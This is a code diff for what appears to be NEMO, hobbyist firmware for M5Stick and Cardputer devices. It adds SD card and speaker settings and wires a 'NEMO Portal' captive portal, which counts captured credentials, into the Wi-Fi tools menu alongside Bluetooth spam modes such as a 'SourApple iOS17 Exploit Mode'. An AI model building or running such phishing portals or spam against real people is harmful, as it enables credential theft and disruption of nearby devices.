@@ -8,9 +8,13 @@
 //#define CARDPUTER
 // -=-=- Uncommenting more than one at a time will result in errors -=-=-
 
-String buildver="2.1.3";
+String buildver="2.2.1";
 #define BGCOLOR BLACK
 #define FGCOLOR GREEN
+
+// -=-=- NEMO Portal Language -=- Thanks, @marivaaldo! -=-=-
+#define LANGUAGE_EN_US
+//#define LANGUAGE_PT_BR
 
 #if defined(STICK_C_PLUS)
   #include <M5StickCPlus.h>
@@ -27,9 +31,14 @@ String buildver="2.1.3";
   #define ACTIVE_LOW_IR
   #define ROTATION
   #define USE_EEPROM
+  //#define SDCARD   //Requires a custom-built adapter
   // -=-=- ALIASES -=-=-
   #define DISP M5.Lcd
   #define IRLED 9
+  #define SPEAKER M5.Beep
+  #define SD_CLK_PIN 0
+  #define SD_MISO_PIN 36
+  #define SD_MOSI_PIN 26
 #endif
 
 #if defined(STICK_C_PLUS2)
@@ -41,10 +50,11 @@ String buildver="2.1.3";
   #define SMALL_TEXT 2
   #define TINY_TEXT 1
   // -=-=- FEATURES -=-=-
-  // #define RTC //TODO: plus2 has a BM8563 RTC but the class isn't the same, needs work.  
   #define ACTIVE_LOW_IR
   #define ROTATION
-  //#define USE_EEPROM //TODO: This won't work until RTC is sorted out
+  #define USE_EEPROM  
+  //#define RTC      //TODO: plus2 has a BM8563 RTC but the class isn't the same, needs work.  
+  //#define SDCARD   //Requires a custom-built adapter
   // -=-=- ALIASES -=-=-
   #define DISP M5.Lcd
   #define IRLED 19
@@ -53,6 +63,10 @@ String buildver="2.1.3";
   #define M5_BUTTON_RST 39
   //TODO: Figure out screen brightness on PLUS2 (if possible at all?) without AXP.
   #define BACKLIGHT 27 // best I can tell from the schematics?
+  #define SPEAKER M5.Beep
+  #define SD_CLK_PIN 0
+  #define SD_MISO_PIN 36
+  #define SD_MOSI_PIN 26
 #endif
 
 #if defined(STICK_C)
@@ -69,9 +83,14 @@ String buildver="2.1.3";
   #define AXP
   #define ROTATION
   #define USE_EEPROM
+  //#define SDCARD   //Requires a custom-built adapter
   // -=-=- ALIASES -=-=-
   #define DISP M5.Lcd
   #define IRLED 9
+  #define SPEAKER M5.Beep
+  #define SD_CLK_PIN 0
+  #define SD_MISO_PIN 36
+  #define SD_MOSI_PIN 26
 #endif
 
 #if defined(CARDPUTER)
@@ -87,10 +106,16 @@ String buildver="2.1.3";
   #define HID
   #define ACTIVE_LOW_IR
   #define USE_EEPROM
+  #define SDCARD
   // -=-=- ALIASES -=-=-
   #define DISP M5Cardputer.Display
   #define IRLED 44
   #define BACKLIGHT 38
+  #define SPEAKER M5Cardputer.Speaker
+  #define SD_CLK_PIN 40
+  #define SD_MISO_PIN 39
+  #define SD_MOSI_PIN 14
+  #define SD_CS_PIN 12
 #endif
 
 // -=-=-=-=-=- LIST OF CURRENTLY DEFINED FEATURES -=-=-=-=-=-
@@ -102,34 +127,8 @@ String buildver="2.1.3";
 // USE_EEPROM - Store settings in EEPROM
 // ROTATION   - Allow screen to be rotated
 // DISP       - Set to the API's Display class
-
-#include <IRremoteESP8266.h>
-#include <IRsend.h>
-#include "applejuice.h"
-#include "WORLD_IR_CODES.h"
-#include "wifispam.h"
-#include <BLEUtils.h>
-#include <BLEServer.h>
-
-int advtime = 0; 
-int cursor = 0;
-int wifict = 0;
-int brightness = 100;
-int ajDelay = 1000;
-bool rstOverride = false; // Reset Button Override. Set to true when navigating menus.
-bool sourApple = false;   // Internal flag to place AppleJuice into SourApple iOS17 Exploit Mode
-bool swiftPair = false;   // Internal flag to place AppleJuice into Swift Pair random packet Mode
-bool androidPair = false; // Internal flag to place AppleJuice into Android Pair random packet Mode
-bool maelstrom = false;   // Internal flag to place AppleJuice into Bluetooth Maelstrom mode
-#if defined(USE_EEPROM)
-  #include <EEPROM.h>
-  #define EEPROM_SIZE 4
-#endif
-
-struct MENU {
-  char name[19];
-  int command;
-};
+// SDCARD     - Device has an SD Card Reader attached 
+// SPEAKER    - Aliased to the prefix used for making noise
 
 /// SWITCHER ///
 // Proc codes
@@ -145,13 +144,49 @@ struct MENU {
 // 9  - AppleJuice Advertisement
 // 10 - Credits 
 // 11 - Wifi beacon spam
-// 12 - Wifi spam menu
+// 12 - Wifi tools menu
 // 13 - TV-B-Gone Region Setting
 // 14 - Wifi scanning
 // 15 - Wifi scan results
 // 16 - Bluetooth Spam Menu
 // 17 - Bluetooth Maelstrom
 // 18 - QR Codes
+// 19 - NEMO Portal
+
+#include <IRremoteESP8266.h>
+#include <IRsend.h>
+#include <DNSServer.h>
+#include <WebServer.h>
+#include "applejuice.h"
+#include "WORLD_IR_CODES.h"
+#include "wifispam.h"
+#include "sd.h"
+#include "portal.h"
+#include <BLEUtils.h>
+#include <BLEServer.h>
+
+int advtime = 0; 
+int cursor = 0;
+int wifict = 0;
+int brightness = 100;
+int ajDelay = 1000;
+bool rstOverride = false;   // Reset Button Override. Set to true when navigating menus.
+bool sourApple = false;     // Internal flag to place AppleJuice into SourApple iOS17 Exploit Mode
+bool swiftPair = false;     // Internal flag to place AppleJuice into Swift Pair random packet Mode
+bool androidPair = false;   // Internal flag to place AppleJuice into Android Pair random packet Mode
+bool maelstrom = false;     // Internal flag to place AppleJuice into Bluetooth Maelstrom mode
+bool portal_active = false; // Internal flag used to ensure NEMO Portal exits cleanly 
+const byte PortalTickTimer = 1000;
+
+#if defined(USE_EEPROM)
+  #include <EEPROM.h>
+  #define EEPROM_SIZE 4
+#endif
+
+struct MENU {
+  char name[19];
+  int command;
+};
 
 struct QRCODE {
   char name[19];
@@ -231,6 +266,11 @@ void check_menu_press() {
   if (digitalRead(M5_BUTTON_MENU) == LOW){
 #endif
     dimtimer();
+    if(portal_active){
+      // just in case we escape the portal with the main menu button
+      shutdownWebServer();
+      portal_active = false;
+    }
     isSwitching = true;
     rstOverride = false;
     current_proc = 1;
@@ -338,13 +378,15 @@ void dimtimer(){
 }
 
 void screen_dim_proc() {
-  check_menu_press();
-  check_next_press();
-  check_select_press();
-  if (screen_dim_dimmed == false) {
-    if (uptime() == screen_dim_current || (uptime() + 1) == screen_dim_current || (uptime() + 2) == screen_dim_current) {
-      screenBrightness(10);
-      screen_dim_dimmed = true;
+  if(screen_dim_time > 0){
+    check_menu_press();
+    check_next_press();
+    check_select_press();
+    if (screen_dim_dimmed == false) {
+      if (uptime() == screen_dim_current || (uptime() + 1) == screen_dim_current || (uptime() + 2) == screen_dim_current) {
+        screenBrightness(10);
+        screen_dim_dimmed = true;
+      }
     }
   }
 }
@@ -352,12 +394,14 @@ void screen_dim_proc() {
 /// Dimmer MENU ///
 MENU dmenu[] = {
   { "Back", screen_dim_time},
+  { "Never", 0},
   { "5 seconds", 5},
   { "10 seconds", 10},
   { "15 seconds", 15},
-  { "20 seconds", 20},
-  { "25 seconds", 25},
   { "30 seconds", 30},
+  { "1 minute", 60},
+  { "2 minutes", 120},
+  { "4 minutes", 240},
 };
 int dmenu_size = sizeof(dmenu) / sizeof(MENU);
 
@@ -366,7 +410,7 @@ void dmenu_setup() {
   DISP.setCursor(0, 5, 1);
   DISP.println("SET AUTO DIM TIME");
   delay(1000);
-  cursor = (screen_dim_time / 5) - 1;
+  cursor = 0;
   rstOverride = true;
   drawmenu(dmenu, dmenu_size);
   delay(500); // Prevent switching after menu loads up
@@ -1317,11 +1361,12 @@ void btmaelstrom_loop(){
 
 /// WIFI MENU ///
 MENU wsmenu[] = {
-  { "Back", 4},
+  { "Back", 5},
   { "Scan Wifi", 0},
   { "Spam Funny", 1},
   { "Spam Rickroll", 2},
   { "Spam Random", 3},
+  { "NEMO Portal", 4},
 };
 int wsmenu_size = sizeof(wsmenu) / sizeof (MENU);
 
@@ -1360,6 +1405,9 @@ void wsmenu_loop() {
         spamtype = 3;
         break;
       case 4:
+        current_proc = 19;
+        break;
+      case 5:
         current_proc = 1;
         break;
     }
@@ -1546,6 +1594,38 @@ void qrmenu_loop() {
   }
 }
 
+/// NEMO PORTAL
+
+void portal_setup(){
+  setupWiFi();
+  setupWebServer();
+  portal_active = true;    
+  cursor = 0;
+  rstOverride = true;
+  printHomeToScreen();
+  delay(500); // Prevent switching after menu loads up
+}
+
+void portal_loop(){
+  if ((millis() - lastTick) > PortalTickTimer) {
+    lastTick = millis();
+    if (totalCapturedCredentials != previousTotalCapturedCredentials) {
+      previousTotalCapturedCredentials = totalCapturedCredentials;
+      printHomeToScreen();
+    }
+  }
+  dnsServer.processNextRequest();
+  webServer.handleClient();
+  if (check_next_press()){
+    shutdownWebServer();
+    portal_active = false;
+    rstOverride = false;
+    isSwitching = true;
+    current_proc = 12;
+    delay(500);
+  }
+}
+
 /// ENTRY ///
 void setup() {
 #if defined(CARDPUTER)
@@ -1557,11 +1637,11 @@ void setup() {
 #endif
   #if defined(USE_EEPROM)
     EEPROM.begin(EEPROM_SIZE);
-    Serial.printf("EEPROM 0: %d\n", EEPROM.read(0));
-    Serial.printf("EEPROM 1: %d\n", EEPROM.read(1));
-    Serial.printf("EEPROM 2: %d\n", EEPROM.read(2));
-    Serial.printf("EEPROM 3: %d\n", EEPROM.read(3));
-    if(EEPROM.read(0) > 3 || EEPROM.read(1) > 30 || EEPROM.read(2) > 100 || EEPROM.read(3) > 1) {
+    Serial.printf("EEPROM 0 - Rotation:   %d\n", EEPROM.read(0));
+    Serial.printf("EEPROM 1 - Dim Time:   %d\n", EEPROM.read(1));
+    Serial.printf("EEPROM 2 - Brightness: %d\n", EEPROM.read(2));
+    Serial.printf("EEPROM 3 - TVBG Reg:   %d\n", EEPROM.read(3));
+    if(EEPROM.read(0) > 3 || EEPROM.read(1) > 240 || EEPROM.read(2) > 100 || EEPROM.read(3) > 1) {
       // Assume out-of-bounds settings are a fresh/corrupt EEPROM and write defaults for everything
       Serial.println("EEPROM likely not properly configured. Writing defaults.");
       #if defined(CARDPUTER)
@@ -1606,7 +1686,9 @@ void setup() {
   pAdvertising = pServer->getAdvertising();
   BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
 
-  // Finish with time to show logo
+  // Nemo Portal Init
+  setupSdCard();
+  bootTime = lastActivity = millis();
 }
 
 void loop() {
@@ -1619,6 +1701,7 @@ void loop() {
   // Switcher
   if (isSwitching) {
     isSwitching = false;
+    Serial.printf("Switching To Task: %d\n", current_proc);
     switch (current_proc) {
 #if defined(RTC)
       case 0:
@@ -1685,7 +1768,9 @@ void loop() {
       case 18:
         qrmenu_setup();
         break;
-
+      case 19:
+        portal_setup();
+        break;
     }
   }
 
@@ -1754,6 +1839,9 @@ void loop() {
       break;
     case 18:
       qrmenu_loop();
+      break;
+    case 19:
+      portal_loop();
       break;
   }
 }
